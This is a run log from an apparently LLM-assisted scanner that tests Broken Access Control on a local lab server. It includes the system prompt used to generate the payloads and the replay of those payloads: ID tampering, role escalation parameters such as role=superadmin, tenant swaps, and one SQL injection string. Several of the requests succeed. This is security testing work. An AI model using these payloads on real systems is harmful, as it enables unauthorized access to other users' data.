2026-03-31 14:15:29 | INFO | utils.logger | Run logger initialized at logs\run_20260331_141529.log
2026-03-31 14:17:04 | DEBUG | openai._base_client | Sending HTTP Request: POST https://api.deepseek.com/chat/completions
2026-03-31 14:17:04 | DEBUG | httpcore.connection | connect_tcp.started host='127.0.0.1' port=7897 local_address=None timeout=30 socket_options=None
2026-03-31 14:17:04 | DEBUG | httpcore.connection | connect_tcp.complete return_value=<httpcore._backends.sync.SyncStream object at 0x0000021A3BB98CB0>
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | send_request_headers.started request=<Request [b'CONNECT']>
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | send_request_headers.complete
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | send_request_body.started request=<Request [b'CONNECT']>
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | send_request_body.complete
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | receive_response_headers.started request=<Request [b'CONNECT']>
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | receive_response_headers.complete return_value=(b'HTTP/1.1', 200, b'Connection established', [])
2026-03-31 14:17:04 | DEBUG | httpcore.proxy | start_tls.started ssl_context=<ssl.SSLContext object at 0x0000021A3BB972D0> server_hostname='api.deepseek.com' timeout=30
2026-03-31 14:17:04 | DEBUG | httpcore.proxy | start_tls.complete return_value=<httpcore._backends.sync.SyncStream object at 0x0000021A3BB98DD0>
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | send_request_headers.started request=<Request [b'POST']>
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | send_request_headers.complete
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | send_request_body.started request=<Request [b'POST']>
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | send_request_body.complete
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | receive_response_headers.started request=<Request [b'POST']>
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | receive_response_headers.complete return_value=(b'HTTP/1.1', 200, b'OK', [(b'Server', b'openresty'), (b'Content-Type', b'application/json'), (b'vary', b'origin, access-control-request-method, access-control-request-headers'), (b'access-control-allow-credentials', b'true'), (b'x-ds-trace-id', b'100314852a1fd63fd53e629bf1d59f32'), (b'Strict-Transport-Security', b'max-age=31536000; includeSubDomains; preload'), (b'X-Content-Type-Options', b'nosniff'), (b'Transfer-Encoding', b'chunked'), (b'Connection', b'keep-alive'), (b'Date', b'Tue, 31 Mar 2026 06:17:04 GMT'), (b'EO-LOG-UUID', b'15204527692063094018'), (b'EO-Cache-Status', b'MISS')])
2026-03-31 14:17:04 | INFO | httpx | HTTP Request: POST https://api.deepseek.com/chat/completions "HTTP/1.1 200 OK"
2026-03-31 14:17:04 | DEBUG | httpcore.http11 | receive_response_body.started request=<Request [b'POST']>
2026-03-31 14:17:19 | DEBUG | httpcore.http11 | receive_response_body.complete
2026-03-31 14:17:19 | DEBUG | httpcore.http11 | response_closed.started
2026-03-31 14:17:19 | DEBUG | httpcore.http11 | response_closed.complete
2026-03-31 14:17:19 | DEBUG | openai._base_client | HTTP Response: POST https://api.deepseek.com/chat/completions "200 OK" Headers({'server': 'openresty', 'content-type': 'application/json', 'vary': 'origin, access-control-request-method, access-control-request-headers', 'access-control-allow-credentials': 'true', 'x-ds-trace-id': '100314852a1fd63fd53e629bf1d59f32', 'strict-transport-security': 'max-age=31536000; includeSubDomains; preload', 'x-content-type-options': 'nosniff', 'transfer-encoding': 'chunked', 'connection': 'keep-alive', 'date': 'Tue, 31 Mar 2026 06:17:04 GMT', 'eo-log-uuid': '15204527692063094018', 'eo-cache-status': 'MISS'})
2026-03-31 14:17:19 | DEBUG | openai._base_client | request_id: None
2026-03-31 14:17:19 | DEBUG | core.llm_agent | LLM raw payload response chars=1834
2026-03-31 14:17:19 | DEBUG | core.llm_agent | LLM payload response parsed directly as JSON
2026-03-31 14:17:19 | INFO | core.llm_agent | LLM payload generation success: method=GET url=http://127.0.0.1:8000/api/v1/user/avatar?uid=1001 payload_count=5
2026-03-31 14:17:19 | INFO | core.llm_agent | Batch payload generation for request_index=8
2026-03-31 14:17:19 | INFO | core.llm_agent | LLM payload generation start: method=GET url=http://127.0.0.1:8000/api/v1/file/download?file_id=f-1001 model=deepseek-chat max_payloads=5
2026-03-31 14:17:20 | DEBUG | core.llm_agent | LLM payload generation attempt=1/3
2026-03-31 14:17:20 | DEBUG | openai._base_client | Request options: {'method': 'post', 'url': '/chat/completions', 'files': None, 'idempotency_key': 'stainless-python-retry-fbf8eee4-db3b-43cc-9bff-b2cbb8be9912', 'content': None, 'json_data': {'messages': [{'role': 'system', 'content': 'You are a senior red-team API security expert focused on Broken Access Control testing.\n\nTask:\nAnalyze one HTTP API request and generate mutation payloads for authorization bypass testing,\nespecially horizontal privilege escalation (IDOR) and vertical privilege escalation.\n\nRules:\n1. Output must be JSON only. Do not include markdown, explanation, or extra text.\n2. Output must be a JSON array.\n3. Each element must be an object with this schema:\n\t{\n\t  "name": "short-payload-name",\n\t  "query": {"optional": "query param overrides"},\n\t  "json_body": {"optional": "json body overrides"},\n\t  "form_body": {"optional": "form field overrides"},\n\t  "headers": {"optional": "header overrides"},\n\t  "reason": "short reason",\n\t  "mitigation": "targeted defensive recommendation for this endpoint"\n\t}\n4. Keep only fields that need overriding. Keep other keys empty objects.\n5. Focus on identity and privilege-related parameters, such as:\n\tid, user_id, uid, account_id, owner_id, username, role, tenant_id, org_id.\n6. Produce diverse mutations, such as:\n\t- Numeric ID increment/decrement\n\t- Replacing current user identifier with another user marker\n\t- Role escalation attempt (user -> admin)\n\t- Tenant or organization boundary crossover\n\t- Object ownership parameter swap\n7. The "mitigation" field must be defensive and specific, e.g. ownership validation, RBAC/ABAC checks, UUID usage, deny-by-default policy, audit alerts.\n\nSafety boundary:\nOnly produce payload suggestions for authorized security testing environments.'}, {'role': 'user', 'content': 'Target HTTP request (JSON):\n{\n  "method": "GET",\n  "url": "http://127.0.0.1:8000/api/v1/file/download?file_id=f-1001",\n  "headers": {\n    "Accept": "application/json",\n    "User-Agent": "LLM-API-Vuln-Scanner-Lab",\n    "Authorization": "Bearer user_A_token"\n  },\n  "query": {\n    "file_id": "f-1001"\n  },\n  "json_body": null,\n  "form_body": null,\n  "body_text": ""\n}\n\nReturn exactly a JSON array with at most 5 payload objects.'}], 'model': 'deepseek-chat', 'temperature': 0.2}}
2026-03-31 14:17:20 | DEBUG | openai._base_client | Sending HTTP Request: POST https://api.deepseek.com/chat/completions
2026-03-31 14:17:20 | DEBUG | httpcore.connection | connect_tcp.started host='127.0.0.1' port=7897 local_address=None timeout=30 socket_options=None
2026-03-31 14:17:20 | DEBUG | httpcore.connection | connect_tcp.complete return_value=<httpcore._backends.sync.SyncStream object at 0x0000021A3BBAD640>
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | send_request_headers.started request=<Request [b'CONNECT']>
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | send_request_headers.complete
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | send_request_body.started request=<Request [b'CONNECT']>
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | send_request_body.complete
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | receive_response_headers.started request=<Request [b'CONNECT']>
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | receive_response_headers.complete return_value=(b'HTTP/1.1', 200, b'Connection established', [])
2026-03-31 14:17:20 | DEBUG | httpcore.proxy | start_tls.started ssl_context=<ssl.SSLContext object at 0x0000021A3BBA4050> server_hostname='api.deepseek.com' timeout=30
2026-03-31 14:17:20 | DEBUG | httpcore.proxy | start_tls.complete return_value=<httpcore._backends.sync.SyncStream object at 0x0000021A3BBAD1C0>
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | send_request_headers.started request=<Request [b'POST']>
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | send_request_headers.complete
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | send_request_body.started request=<Request [b'POST']>
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | send_request_body.complete
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | receive_response_headers.started request=<Request [b'POST']>
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | receive_response_headers.complete return_value=(b'HTTP/1.1', 200, b'OK', [(b'Server', b'openresty'), (b'Content-Type', b'application/json'), (b'vary', b'origin, access-control-request-method, access-control-request-headers'), (b'access-control-allow-credentials', b'true'), (b'x-ds-trace-id', b'1dadda174c3330523d694ae7cc2c0389'), (b'Strict-Transport-Security', b'max-age=31536000; includeSubDomains; preload'), (b'X-Content-Type-Options', b'nosniff'), (b'Transfer-Encoding', b'chunked'), (b'Connection', b'keep-alive'), (b'Date', b'Tue, 31 Mar 2026 06:17:19 GMT'), (b'EO-LOG-UUID', b'14491261737612258943'), (b'EO-Cache-Status', b'MISS')])
2026-03-31 14:17:20 | INFO | httpx | HTTP Request: POST https://api.deepseek.com/chat/completions "HTTP/1.1 200 OK"
2026-03-31 14:17:20 | DEBUG | httpcore.http11 | receive_response_body.started request=<Request [b'POST']>
2026-03-31 14:17:36 | DEBUG | httpcore.http11 | receive_response_body.complete
2026-03-31 14:17:36 | DEBUG | httpcore.http11 | response_closed.started
2026-03-31 14:17:36 | DEBUG | httpcore.http11 | response_closed.complete
2026-03-31 14:17:36 | DEBUG | openai._base_client | HTTP Response: POST https://api.deepseek.com/chat/completions "200 OK" Headers({'server': 'openresty', 'content-type': 'application/json', 'vary': 'origin, access-control-request-method, access-control-request-headers', 'access-control-allow-credentials': 'true', 'x-ds-trace-id': '1dadda174c3330523d694ae7cc2c0389', 'strict-transport-security': 'max-age=31536000; includeSubDomains; preload', 'x-content-type-options': 'nosniff', 'transfer-encoding': 'chunked', 'connection': 'keep-alive', 'date': 'Tue, 31 Mar 2026 06:17:19 GMT', 'eo-log-uuid': '14491261737612258943', 'eo-cache-status': 'MISS'})
2026-03-31 14:17:36 | DEBUG | openai._base_client | request_id: None
2026-03-31 14:17:36 | DEBUG | core.llm_agent | LLM raw payload response chars=2080
2026-03-31 14:17:36 | DEBUG | core.llm_agent | LLM payload response parsed directly as JSON
2026-03-31 14:17:36 | INFO | core.llm_agent | LLM payload generation success: method=GET url=http://127.0.0.1:8000/api/v1/file/download?file_id=f-1001 payload_count=5
2026-03-31 14:17:36 | INFO | main | Phase 2 completed: api_success=8 total_apis=8 payloads=40
2026-03-31 14:17:36 | INFO | main | Saved phase-2 output: data\output\phase2_payloads.json
2026-03-31 14:17:36 | INFO | main | Phase 3 start: attack replay and risk evaluation
2026-03-31 14:17:36 | INFO | core.scanner | Attack replay started: endpoints=8
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=1 payload_name=uid-increment
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/payment/cards params={'uid': '1002'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Starting new HTTP connection (1): 127.0.0.1:8000
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/payment/cards?uid=1002 HTTP/1.1" 403 22
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=1 payload_name=uid-increment status=403
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=1 payload_name=uid-decrement
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/payment/cards params={'uid': '1000'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/payment/cards?uid=1000 HTTP/1.1" 403 22
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=1 payload_name=uid-decrement status=403
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=1 payload_name=uid-admin-id
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/payment/cards params={'uid': '1'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/payment/cards?uid=1 HTTP/1.1" 403 22
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=1 payload_name=uid-admin-id status=403
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=1 payload_name=header-owner-uid-mismatch
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/payment/cards params={'uid': '1002'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/payment/cards?uid=1002 HTTP/1.1" 403 22
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=1 payload_name=header-owner-uid-mismatch status=403
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=1 payload_name=uid-negative
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/payment/cards params={'uid': '-1'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/payment/cards?uid=-1 HTTP/1.1" 403 22
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=1 payload_name=uid-negative status=403
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=2 payload_name=order-id-increment
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/order/detail params={'order_id': '50002'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/order/detail?order_id=50002 HTTP/1.1" 200 100
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=2 payload_name=order-id-increment status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=2 payload_name=order-id-decrement
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/order/detail params={'order_id': '50000'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/order/detail?order_id=50000 HTTP/1.1" 404 28
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=2 payload_name=order-id-decrement status=404
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=2 payload_name=user-id-injection-query
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/order/detail params={'order_id': '50001', 'user_id': '1002'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/order/detail?order_id=50001&user_id=1002 HTTP/1.1" 200 100
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=2 payload_name=user-id-injection-query status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=2 payload_name=role-escalation-header
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/order/detail params={'order_id': '50001'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/order/detail?order_id=50001 HTTP/1.1" 200 100
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=2 payload_name=role-escalation-header status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=2 payload_name=tenant-boundary-bypass
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/order/detail params={'order_id': '50001', 'tenant_id': 'other_tenant'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/order/detail?order_id=50001&tenant_id=other_tenant HTTP/1.1" 200 100
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=2 payload_name=tenant-boundary-bypass status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=3 payload_name=uid-increment
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/profile params={'uid': '1002'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/profile?uid=1002 HTTP/1.1" 200 176
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=3 payload_name=uid-increment status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=3 payload_name=uid-decrement
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/profile params={'uid': '1000'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/profile?uid=1000 HTTP/1.1" 404 27
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=3 payload_name=uid-decrement status=404
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=3 payload_name=uid-admin
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/profile params={'uid': '1'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/profile?uid=1 HTTP/1.1" 404 27
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=3 payload_name=uid-admin status=404
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=3 payload_name=uid-negative
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/profile params={'uid': '-1'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/profile?uid=-1 HTTP/1.1" 404 27
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=3 payload_name=uid-negative status=404
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=3 payload_name=uid-string-injection
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/profile params={'uid': "1001' OR '1'='1"}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/profile?uid=1001%27+OR+%271%27%3D%271 HTTP/1.1" 404 27
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=3 payload_name=uid-string-injection status=404
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=4 payload_name=uid-increment
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/settings params={'uid': '1002'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/settings?uid=1002 HTTP/1.1" 200 164
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=4 payload_name=uid-increment status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=4 payload_name=uid-decrement
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/settings params={'uid': '1000'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/settings?uid=1000 HTTP/1.1" 200 164
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=4 payload_name=uid-decrement status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=4 payload_name=uid-admin-id
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/settings params={'uid': '1'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/settings?uid=1 HTTP/1.1" 200 164
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=4 payload_name=uid-admin-id status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=4 payload_name=uid-current-user-token-mismatch
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/settings params={'uid': '1001'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/settings?uid=1001 HTTP/1.1" 401 25
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=4 payload_name=uid-current-user-token-mismatch status=401
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=4 payload_name=uid-parameter-removal
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/user/settings params={'uid': '1001'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/user/settings?uid=1001 HTTP/1.1" 200 164
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=4 payload_name=uid-parameter-removal status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=5 payload_name=admin-role-header
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/admin/audit params=None
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/admin/audit HTTP/1.1" 200 140
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=5 payload_name=admin-role-header status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=5 payload_name=tenant-id-header
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/admin/audit params=None
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/admin/audit HTTP/1.1" 200 140
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=5 payload_name=tenant-id-header status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=5 payload_name=user-id-query
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/admin/audit params={'user_id': 'admin'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/admin/audit?user_id=admin HTTP/1.1" 200 140
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=5 payload_name=user-id-query status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=5 payload_name=role-query
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/admin/audit params={'role': 'superadmin'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/admin/audit?role=superadmin HTTP/1.1" 200 140
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=5 payload_name=role-query status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=5 payload_name=org-id-header
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/admin/audit params=None
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/admin/audit HTTP/1.1" 200 140
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=5 payload_name=org-id-header status=200
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=6 payload_name=increment-id
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/system/announcements params={'id': '2'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/system/announcements?id=2 HTTP/1.1" 206 48
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=6 payload_name=increment-id status=206
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=6 payload_name=negative-id
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/system/announcements params={'id': '-1'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/system/announcements?id=-1 HTTP/1.1" 206 51
2026-03-31 14:17:36 | DEBUG | core.scanner | Attack replay success: request_index=6 payload_name=negative-id status=206
2026-03-31 14:17:36 | DEBUG | core.scanner | Replaying attack payload: request_index=6 payload_name=admin-id-bypass
2026-03-31 14:17:36 | DEBUG | core.scanner | Sending request: method=GET url=http://127.0.0.1:8000/api/v1/system/announcements params={'id': '0'}
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | Resetting dropped connection: 127.0.0.1
2026-03-31 14:17:36 | DEBUG | urllib3.connectionpool | http://127.0.0.1:8000 "GET /api/v1/system/announcements?id=0 HTTP/1.1" 206 51
